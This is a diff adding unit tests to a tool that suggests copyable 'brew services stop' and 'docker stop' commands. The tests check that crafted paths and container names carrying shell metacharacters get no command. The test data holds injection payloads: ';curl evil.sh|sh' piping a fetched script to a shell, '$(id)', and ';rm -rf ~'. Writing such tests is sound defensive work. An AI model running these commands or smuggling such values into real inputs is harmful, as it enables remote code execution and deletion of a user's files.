@@ -155,3 +155,21 @@ describe("tabs", () => {
     expect(isIdle({ ...r, group: "database" }, 0, 8, now)).toBe(false);
   });
 });
+
+describe("copyable commands never carry shell metacharacters", () => {
+  it("a crafted Homebrew-looking path gets no brew command", () => {
+    expect(brewFormula("/usr/local/opt/postgres;curl evil.sh|sh/bin/postgres")).toBeNull();
+    expect(brewFormula("/opt/homebrew/opt/redis$(id)/bin/redis-server")).toBeNull();
+    expect(knownFor(row(5432, "postgres", "/usr/local/opt/postgres;rm -rf ~/bin/postgres"))?.command).toBeUndefined();
+  });
+  it("only real service formulas qualify, matched in full", () => {
+    expect(knownFor(row(6379, "redis-server", "/opt/homebrew/opt/redis/bin/redis-server"))?.command).toBe("brew services stop redis");
+    expect(knownFor(row(3306, "mysqld", "/opt/homebrew/opt/mysql@8.4/bin/mysqld"))?.command).toBe("brew services stop mysql@8.4");
+    expect(knownFor(row(9000, "x", "/opt/homebrew/opt/redisfake/bin/x"))).toBeNull();
+  });
+  it("a container name outside Docker's charset gets no docker stop", () => {
+    const k = knownFor(row(5433, "com.docker.backend", null, { container: { id: "a", name: "db; rm -rf ~", image: "pg" } }))!;
+    expect(k.noQuit).toBe(true);
+    expect(k.command).toBeUndefined();
+  });
+});
